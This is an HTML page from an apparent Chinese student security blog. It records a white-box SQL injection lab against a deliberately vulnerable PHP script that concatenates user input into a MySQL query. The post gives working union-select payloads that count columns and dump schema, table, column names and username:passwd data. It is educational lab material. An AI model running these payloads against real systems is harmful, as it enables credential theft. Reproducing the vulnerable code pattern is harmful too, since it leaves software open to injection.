@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>8.13注入白黑盒测试 | oxxk blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content>
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="在这里可以进行白盒or黑盒，就此对两种方法都进行说明。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="8.13注入白黑盒测试">
+<meta property="og:url" content="https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/index.html">
+<meta property="og:site_name" content="oxxk blog">
+<meta property="og:description" content="在这里可以进行白盒or黑盒，就此对两种方法都进行说明。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13注入1.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13注入2.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13注入3.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13查询数据库.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13查询表.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13查询字段1.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13查询字段2.jpg">
+<meta property="og:image" content="https://0xxk.github.io/images/8.13数据.jpg">
+<meta property="og:updated_time" content="2019-08-13T14:12:43.784Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="8.13注入白黑盒测试">
+<meta name="twitter:description" content="在这里可以进行白盒or黑盒，就此对两种方法都进行说明。">
+<meta name="twitter:image" content="https://0xxk.github.io/images/8.13注入1.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="oxxk blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">0xxk</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/oxxk" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">8.13注入白黑盒测试</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#白盒测试"><span class="post-toc-number">1.</span> <span class="post-toc-text">白盒测试</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mysql-fetch-array-函数"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">mysql_fetch_array()函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#三个回显位"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">三个回显位</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#判断注入类型"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">判断注入类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入参数流程"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">注入参数流程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查找字段数"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">查找字段数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查询数据库"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">查询数据库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查询表"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">查询表</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查询字段"><span class="post-toc-number">1.4.4.</span> <span class="post-toc-text">查询字段</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查询数据"><span class="post-toc-number">1.4.5.</span> <span class="post-toc-text">查询数据</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#黑盒测试"><span class="post-toc-number">2.</span> <span class="post-toc-text">黑盒测试</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-8.13注入白黑盒测试"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">8.13注入白黑盒测试</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-08-13 22:08:41" datetime="2019-08-13T14:08:41.430Z"  itemprop="datePublished">2019-08-13</time>
+
+            <br id="mybreak"/>
+            
+<script>
+	mybreak.style="display:none";
+</script>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">5</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>在这里可以进行白盒or黑盒，就此对两种方法都进行说明。</p>
+<a id="more"></a>
+
+<h1 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h1><p>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">        @$con = mysql_connect(<span class="string">'127.0.0.1'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">        mysql_select_db(<span class="string">'mysql'</span>);</span><br><span class="line">        @$q = $_POST[<span class="string">'sql'</span>];</span><br><span class="line">        $sql = <span class="string">'SELECT * FROM `mysql`.`user` WHERE `user` = \'root\' '</span> . $q; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"将执行了sql语句: &#123;$sql&#125;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">        $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            $arr = mysql_fetch_array($res);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"查询的结果为:&lt;br&gt;&lt;br&gt;&lt;tr&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $arr[<span class="number">0</span>] . <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> . $arr[<span class="number">1</span>] . <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> . $arr[<span class="number">2</span>] . <span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql-fetch-array-函数"><a href="#mysql-fetch-array-函数" class="headerlink" title="mysql_fetch_array()函数"></a>mysql_fetch_array()函数</h2><p>定义如下：</p>
+<p>​        mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有</p>
+<p>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
+<p>​        大致就是将查询到的值以$arr[m]=xx这样的关联数组形式展示出来，且只显示第一行。但关联数组查询的数据会在接下来的行中显示。因此可以使用and 1=2使前面查询不到，就此我们关联查询的就可以显示出来。或者使用limit1,1将第二行读取出来。</p>
+<h2 id="三个回显位"><a href="#三个回显位" class="headerlink" title="三个回显位"></a>三个回显位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;td&gt;&quot; . $arr[0] . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $arr[1] . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $arr[2] . &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>在网页上共输出了$arr[0],$arr[1],$arr[2]这三个数组，由此可以得知：我们在关联查询时只能在前三位查询，否则即使查询到数据，也不会回显出来。</p>
+<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@$q = $_POST[<span class="string">'sql'</span>]; </span><br><span class="line"><span class="string">'SELECT * FROM `mysql`.`user` WHERE `user` = \'root\' '</span> . $q;</span><br></pre></td></tr></table></figure>
+
+<p>在这里接收一个$q参数，并且用.将$q和前面的语句结合在一起。查询语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; $q;</span><br></pre></td></tr></table></figure>
+
+<p>因此在这里可以看作“数字型”注入（原理像，请百度），就此直接在后面拼接上语句即可。</p>
+<h2 id="注入参数流程"><a href="#注入参数流程" class="headerlink" title="注入参数流程"></a>注入参数流程</h2><h3 id="查找字段数"><a href="#查找字段数" class="headerlink" title="查找字段数"></a>查找字段数</h3><p>老方法，既然没有过滤任何关键字。那直接使用二分法排序查询字段数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先order by 30，可以看到有30个字段</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13注入1.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在使用order by 50，发现页面发生了变化。证明没有50个字段</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13注入2.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就此发现原来是49个字段</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13注入3.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>因为白盒审计已经知道前三位回显，接下来就可以使用基础语法去查询了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select x,x,x,4,5,6,7,8,9,,,,,,47,48,49</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><p>首先看一下关联数组时会用到的数组！</p>
+<p>group_concat()函数</p>
+<p>将所有查询到的数据都放在一起输出。如总共有10行，都放在一行输出。为什么要这样呢？因为前面用到了mysql_fetch_array()函数，只会读取一行。所以要将数据放在一行中进行读取。</p>
+<p>查询数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13查询数据库.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h3 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h3><p>常规操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;ceshi&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13查询表.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><p>查询ceshi库content表中的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(ip,&apos;:&apos;,time) from ceshi.content),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13查询字段1.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>查询ceshi库users表中的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(column_name,&apos;::&apos;) from information_schema.COLUMNS where TABLE_NAME=&apos;users&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13查询字段2.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>查询users表中username 和 passwd的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(username,&apos;:&apos;,passwd) from ceshi.users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure>
+
+<p>查询数据</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/8.13数据.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><p>不想写了嗷，洗衣服去了</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-08-13T14:12:43.784Z" itemprop="dateUpdated">2019-08-13 22:12:43</time>
+</span>
+
+
+        
+        原文链接：<a href="/2019/08/13/8.13注入白黑盒测试/" target="_blank" rel="external">https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://0xxk.github.io'">
+            <img src="/img/avatar.jpg" alt="0xxk">
+            <a>0xxk</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/&title=《8.13注入白黑盒测试》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/&title=《8.13注入白黑盒测试》 — oxxk blog&source=在这里可以进行白盒or黑盒，就此对两种方法都进行说明。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《8.13注入白黑盒测试》 — oxxk blog&url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/&via=https://0xxk.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/08/12/新闻界面8.10周末作业/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：新闻作业">下一篇：新闻作业</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2017
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://0xxk.github.io">tomotoes.com</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/&title=《8.13注入白黑盒测试》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/&title=《8.13注入白黑盒测试》 — oxxk blog&source=在这里可以进行白盒or黑盒，就此对两种方法都进行说明。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《8.13注入白黑盒测试》 — oxxk blog&url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/&via=https://0xxk.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACK0lEQVR42u3aQW7DMAwF0dz/0i6QbRt7PqkGEDVaFahi62XBkCJfL7yu9+L/vX4t8lmyv7VkyJCxLeO6Xfcv+7STrPuT8LPJkCHjHEYaCjns0/77YM3PJkOGDBmdR3/zUzJkyJCRlpe1dFOGDBky7hm8NCUvIAkiD7iLa3EZMmRsyEgbA9/8+x/7GzJkyNiEcYVr7et5yH44lQwZMkYzeLp2n/bVGp9pQ/Thy5IhQ8ZoBi8gawGRj1bUCl0ZMmTMZqRX/58e17n0ryWUMmTIOIfRub8iDyU704alDBkyTmPwizMejnmjkaeGDyFehgwZoxlp+doPx7ygLVbkMmTIGMcoXrvjIYx+Ioh+AGTIkHEYY23AraWVPBzLkCFDBg+s6YUdx6CALkOGjNEMHtRWFZ+1/UH4liFDxmhGOlRRC6O8uK3tkSFDxjwGudAng1+ddDANzQ/poAwZMoYyeEug1gZIS1PyA/BHC1OGDBlDGbxojINgoyXAQ3kQdmXIkLEtg49zrQq7aQMABWUZMmQcwOCHS9M7/jW18DJkyBjN4K3KNDXkQxhpCY16sDJkyBjEuMJFHtrvqabNThkyZMxm8FVrcPLStFYky5Ah4xxGZ7QiPRD/VDqoIUOGjBMY/SBbaznUhsYehi1kyJBxMKPW+CRNhU64lyFDhoz0xTwo80QQPVmGDBkHMPj1GR+SSMcp+FBa3MiUIUPG5oxOAclTus5YxjKMDBky9mP8ABUPqHZsPHIWAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2017/10/11");
+}, 1000);
+
+/* 文章块的淡出 */
